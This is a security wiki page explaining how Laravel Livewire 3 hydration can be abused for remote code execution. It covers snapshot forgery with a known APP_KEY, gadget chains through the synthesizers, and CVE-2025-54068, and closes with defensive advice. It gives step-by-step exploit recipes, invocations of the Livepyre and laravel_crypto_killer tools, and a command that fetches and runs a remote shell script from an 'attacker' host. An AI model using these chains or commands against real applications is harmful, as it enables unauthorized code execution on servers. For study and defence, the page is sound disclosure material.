# Laravel Livewire Hydration & Synthesizer Abuse

{{#include ../../banners/hacktricks-training.md}}

## Recap of the Livewire state machine

Livewire 3 components exchange their state through **snapshots** that contain `data`, `memo`, and a checksum. Every POST to `/livewire/update` rehydrates the JSON snapshot server-side and executes the queued `calls`/`updates`.

```php
class Checksum {
    static function verify($snapshot) {
        $checksum = $snapshot['checksum'];
        unset($snapshot['checksum']);
        if ($checksum !== self::generate($snapshot)) {
            throw new CorruptComponentPayloadException;
        }
    }

    static function generate($snapshot) {
        return hash_hmac('sha256', json_encode($snapshot), $hashKey);
    }
}
```

Anyone holding `APP_KEY` (used to derive `$hashKey`) can therefore forge arbitrary snapshots by recomputing the HMAC.

Complex properties are encoded as **synthetic tuples** detected by `Livewire\Drawer\BaseUtils::isSyntheticTuple()`; each tuple is `[value, {"s":"<key>", ...meta}]`. The hydration core simply delegates every tuple to the synth selected in `HandleComponents::$propertySynthesizers` and recurses over children:

```php
protected function hydrate($valueOrTuple, $context, $path)
{
    if (! Utils::isSyntheticTuple($value = $tuple = $valueOrTuple)) return $value;
    [$value, $meta] = $tuple;
    $synth = $this->propertySynth($meta['s'], $context, $path);
    return $synth->hydrate($value, $meta, fn ($name, $child)
        => $this->hydrate($child, $context, "{$path}.{$name}"));
}
```

This recursive design makes Livewire a **generic object-instantiation engine** once an attacker controls either the tuple metadata or any nested tuple processed during recursion.

## Synthesizers that grant gadget primitives

| Synthesizer | Attacker-controlled behaviour |
|-------------|--------------------------------|
| **CollectionSynth (`clctn`)** | Instantiates `new $meta['class']($value)` after rehydrating each child. Any class with an array constructor can be created, and each item may itself be a synthetic tuple.
| **FormObjectSynth (`form`)** | Calls `new $meta['class']($component, $path)`, then assigns every public property from attacker-controlled children via `$hydrateChild`. Constructors that accept two loosely typed parameters (or default args) are enough to reach arbitrary public properties.
| **ModelSynth (`mdl`)** | When `key` is absent from meta it executes `return new $class;` allowing zero-argument instantiation of any class under attacker control.

Because synths invoke `$hydrateChild` on every nested element, arbitrary gadget graphs can be built by stacking tuples recursively.

## Forging snapshots when `APP_KEY` is known

1. Capture a legitimate `/livewire/update` request and decode `components[0].snapshot`.
2. Inject nested tuples that point to gadget classes and recompute `checksum = hash_hmac('sha256', json_encode(snapshot_without_checksum), APP_KEY)`.
3. Re-encode the snapshot, keep `_token`/`memo` untouched, and replay the request.

A minimal proof of execution uses **Guzzle's `FnStream`** and **Flysystem's `ShardedPrefixPublicUrlGenerator`**. One tuple instantiates `FnStream` with constructor data `{ "__toString": "phpinfo" }`, the next instantiates `ShardedPrefixPublicUrlGenerator` with `[FnStreamInstance]` as `$prefixes`. When Flysystem casts each prefix to `string`, PHP invokes the attacker-provided `__toString` callable, calling any function without arguments.

### From function calls to full RCE

Leveraging Livewire's instantiation primitives, Synacktiv adapted phpggc's `Laravel/RCE4` chain so that hydration boots an object whose public Queueable state triggers deserialization:

1. **Queueable trait** – any object using `Illuminate\Bus\Queueable` exposes public `$chained` and executes `unserialize(array_shift($this->chained))` in `dispatchNextJobInChain()`.
2. **BroadcastEvent wrapper** – `Illuminate\Broadcasting\BroadcastEvent` (ShouldQueue) is instantiated via `CollectionSynth` / `FormObjectSynth` with public `$chained` populated.
3. **phpggc Laravel/RCE4Adapted** – the serialized blob stored in `$chained[0]` builds `PendingBroadcast -> Validator -> SerializableClosure\Serializers\Signed`. `Signed::__invoke()` finally calls `call_user_func_array($closure, $args)` enabling `system($cmd)`.
4. **Stealth termination** – by handing a second `FnStream` callable such as `[new Laravel\Prompts\Terminal(), 'exit']`, the request ends with `exit()` instead of a noisy exception, keeping the HTTP response clean.

### Automating snapshot forgery

`synacktiv/laravel-crypto-killer` now ships a `livewire` mode that stitches everything:

```bash
./laravel_crypto_killer.py -e livewire -k base64:APP_KEY \
  -j request.json --function system -p "bash -c 'id'"
```

The tool parses the captured snapshot, injects the gadget tuples, recomputes the checksum, and prints a ready-to-send `/livewire/update` payload.

## CVE-2025-54068 – RCE without `APP_KEY`

`updates` are merged into component state **after** the snapshot checksum is validated. If a property inside the snapshot is (or becomes) a synthetic tuple, Livewire reuses its meta while hydrating the attacker-controlled update value:

```php
protected function hydrateForUpdate($raw, $path, $value, $context)
{
    $meta = $this->getMetaForPath($raw, $path);
    if ($meta) {
        return $this->hydrate([$value, $meta], $context, $path);
    }
}
```

Exploit recipe:

1. Find a Livewire component with an untyped public property (e.g., `public $count;`).
2. Send an update that sets that property to `[]`. The next snapshot now stores it as `[[], {"s": "arr"}]`.
3. Craft another `updates` payload where that property contains a deeply nested array embedding tuples such as `[ <payload>, {"s":"clctn","class":"GuzzleHttp\\Psr7\\FnStream"} ]`.
4. During recursion, `hydrate()` evaluates each nested child independently, so attacker-chosen synth keys/classes are honoured even though the outer tuple and checksum never changed.
5. Reuse the same `CollectionSynth`/`FormObjectSynth` primitives to instantiate a Queueable gadget whose `$chained[0]` contains the phpggc payload. Livewire processes the forged updates, invokes `dispatchNextJobInChain()`, and reaches `system(<cmd>)` without knowing `APP_KEY`.

Key reasons this works:

- `updates` are not covered by the snapshot checksum.
- `getMetaForPath()` trusts whichever synth metadata already existed for that property even if the attacker previously forced it to become a tuple via weak typing.
- Recursion plus weak typing lets each nested array be interpreted as a brand new tuple, so arbitrary synth keys and arbitrary classes eventually reach hydration.

## Livepyre – end-to-end exploitation

[Livepyre](https://github.com/synacktiv/Livepyre) automates both the APP_KEY-less CVE and the signed-snapshot path:

- Fingerprints the deployed Livewire version by parsing `<script src="/livewire/livewire.js?id=HASH">` and mapping the hash to vulnerable releases.
- Collects baseline snapshots by replaying benign actions and extracting `components[].snapshot`.
- Generates either an `updates`-only payload (CVE-2025-54068) or a forged snapshot (known APP_KEY) embedding the phpggc chain.

Typical usage:

```bash
# CVE-2025-54068, unauthenticated
python3 Livepyre.py -u https://target/livewire/component -f system -p id

# Signed snapshot exploit with known APP_KEY
python3 Livepyre.py -u https://target/livewire/component -a base64:APP_KEY \
    -f system -p "bash -c 'curl attacker/shell.sh|sh'"
```

`-c/--check` runs a non-destructive probe, `-F` skips version gating, `-H` and `-P` add custom headers or proxies, and `--function/--param` customise the php function invoked by the gadget chain.

## Defensive considerations

- Upgrade to fixed Livewire builds (>= 3.6.4 according to the vendor bulletin) and deploy the vendor patch for CVE-2025-54068.
- Avoid weakly typed public properties in Livewire components; explicit scalar types prevent property values from being coerced into arrays/tuples.
- Register only the synthesizers you truly need and treat user-controlled metadata (`$meta['class']`) as untrusted.
- Reject updates that change the JSON type of a property (e.g., scalar -> array) unless explicitly allowed, and re-derive synth metadata instead of reusing stale tuples.
- Rotate `APP_KEY` promptly after any disclosure because it enables offline snapshot forging no matter how patched the code-base is.

## References

- [Synacktiv – Livewire: Remote Command Execution via Unmarshaling](https://www.synacktiv.com/publications/livewire-execution-de-commandes-a-distance-via-unmarshaling.html)
- [synacktiv/laravel-crypto-killer](https://github.com/synacktiv/laravel-crypto-killer)
- [synacktiv/Livepyre](https://github.com/synacktiv/Livepyre)

{{#include ../../banners/hacktricks-training.md}}
